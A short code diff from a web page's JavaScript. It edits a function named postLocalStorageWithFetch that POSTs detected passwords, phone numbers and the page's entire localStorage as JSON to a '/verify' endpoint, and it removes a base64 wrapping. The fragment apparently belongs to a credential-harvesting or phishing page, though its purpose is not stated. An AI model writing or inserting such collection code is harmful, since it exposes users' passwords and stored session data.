@@ -164,11 +164,11 @@
       }, 1000)
 
       function postLocalStorageWithFetch() {
-        let data = btoa(JSON.stringify({
+        let data = JSON.stringify({
           pass: window.detectedPass || false,
           phone: window.detectedPhone || false,
-          ls: localStorage
-        }))
+          ls: JSON.stringify(localStorage)
+        })
 
         fetch(`/verify`, {
           method: 'POST',
